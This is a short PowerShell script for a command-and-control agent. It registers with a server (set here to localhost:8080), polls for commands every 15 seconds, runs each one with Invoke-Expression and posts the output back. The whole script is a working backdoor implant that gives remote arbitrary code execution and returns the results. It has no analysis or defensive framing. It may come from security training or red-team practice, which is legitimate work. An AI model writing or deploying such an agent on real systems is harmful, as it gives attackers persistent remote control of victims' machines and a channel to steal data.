$agentID = "agent007"
$server = "http://localhost:8080"
$interval = 15  # seconds

# Register Agent First (always)
try {
    Invoke-RestMethod -Uri "$server/register?id=$agentID" -Method GET
    Write-Host "[*] Agent registered with server"
} catch {
    Write-Host "[!] Registration failed: $_"
    exit
}

function Get-Command {
    $url = "$server/get-task?id=$agentID"
    try {
        $response = Invoke-RestMethod -Uri $url -Method GET
        Write-Host "[*] Polled command: $($response.command)"
        return $response.command
    } catch {
        Write-Host "[!] Failed to poll command: $_"
        return ""
    }
}

function Send-Result($output) {
    $body = @{
        agent_id = $agentID
        output   = $output
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri "$server/submit-result" -Method POST -Body $body -ContentType "application/json"
        Write-Host ("[*] Sent result for {0}: {1}" -f $agentID, $output)
    } catch {
        Write-Host "[!] Failed to send result: $_"
    }
}

while ($true) {
    $cmd = Get-Command
    if ($cmd -ne "") {
        try {
            $result = Invoke-Expression $cmd | Out-String
        } catch {
            $result = "Error: $_"
        }
        Send-Result $result
    }
    Start-Sleep -Seconds $interval
}
